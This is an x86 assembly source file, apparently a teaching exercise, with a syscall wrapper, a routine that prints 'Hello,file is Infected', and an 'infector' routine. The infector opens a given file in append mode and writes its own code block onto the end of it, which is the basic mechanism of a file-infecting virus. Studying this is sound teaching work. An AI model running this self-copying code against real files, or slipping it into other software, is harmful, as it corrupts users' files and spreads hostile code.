
section .rodata
    infectionMessage: db "Hello,file is Infected ", 10
    len: equ $ - infectionMessage
    
section .text
global system_call
global infection
global infector


    
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state
    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:
infection:  
    mov eax, 4                        
    xor ebx, ebx
    add ebx, 1
    mov ecx, infectionMessage            
    mov edx, len        
    int 0x80
    ret

infector:
    open_file:
        xor eax, eax
        add eax, 5  ;syscall open                  
        mov ebx, [esp+4] ;             
        mov ecx, 2001o  ;append             
        int 0x80
        mov edi, eax ;filed
    write_virus:
        xor eax, eax
        add eax, 4                    
        mov ebx, edi
        mov ecx, code_start
        mov edx, code_end - code_start           
        int 0x80

    close_file:
        xor eax, eax
        add eax, 6
        mov ebx, edi
        int 0x80
        ret
code_end: